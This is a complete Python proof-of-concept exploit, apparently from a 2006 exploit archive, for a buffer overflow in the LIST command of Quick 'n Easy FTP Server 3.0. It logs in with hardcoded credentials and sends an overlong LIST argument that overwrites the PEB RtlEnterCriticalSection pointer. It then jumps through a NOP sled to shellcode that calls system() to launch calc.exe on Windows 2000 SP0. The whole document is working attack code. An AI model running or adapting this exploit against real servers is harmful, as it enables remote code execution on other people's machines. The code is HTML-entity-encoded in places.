#!/usr/bin/python
#Quick &#039;n Easy FTP Server 3.0 (LIST) 0day PoC exploit
#Proof of Concept: execute calc.exe
#Tested on 2000 SP0 polish
#Bug found by h07
#Date: 18.07.2006

from socket import *

host = &quot;127.0.0.1&quot;
port = 21
user = &quot;h07&quot;
password = &quot;open&quot;
adr1 = 0x01ABED9A # ~Address of shellcode
adr2 = 0x7FFDF020 # RtlEnterCriticalSection pointer

shellcode = (
#bad chars: 0x00 0x0a 0x0d 0x5c 0x2f
#reconstruction PEB block
#mov dword edx, 0x7FFDF020 ;EDX &lt;-- RtlEnterCriticalSection pointer
#mov dword [edx], 0x77F8AA4C ;RtlEnterCriticalSection pointer &lt;-- original value
#...

&quot;\xba\x20\xf0\xfd\x7f\xc7\x02\x4c\xaa\xf8\x77&quot;
&quot;\x33\xC0\x50\x68\x63\x61\x6C\x63\x54\x5B\x50\x53\xB9&quot;
&quot;\xad\xaa\x01\x78&quot; #Address of system() function (2000 SP0 polish)
&quot;\xFF\xD1\xEB\xF7&quot;)

def intel_order(i):
a = chr(i % 256)
i = i &gt;&gt; 8
b = chr(i % 256)
i = i &gt;&gt; 8
c = chr(i % 256)
i = i &gt;&gt; 8
d = chr(i % 256)
str = &quot;%c%c%c%c&quot; % (a, b, c, d)
return str

s = socket(AF_INET, SOCK_STREAM)
s.connect((host, port))
print s.recv(1024)

s.send(&quot;user %s\r\n&quot; % (user))
print s.recv(1024)

s.send(&quot;pass %s\r\n&quot; % (password))
print s.recv(1024)

buffer = &quot;LIST &quot;
buffer += &quot;?&quot;
buffer += &quot;A&quot; * 267
buffer += intel_order(adr1)
buffer += intel_order(adr2)

#EDX &lt;-- adr2 (RtlEnterCriticalSection pointer)
#ECX &lt;-- adr1 (address of shellcode)
#MOV DWORD PTR DS:[EDX],ECX (rewrite RtlEnterCriticalSection pointer)
#MOV DWORD PTR DS:[ECX+4],EDX (exception and jump to shellcode)

buffer += &quot;\x90&quot; * 300 + shellcode
buffer += &quot;\r\n&quot;

s.send(buffer)
print s.recv(1024)

s.close()
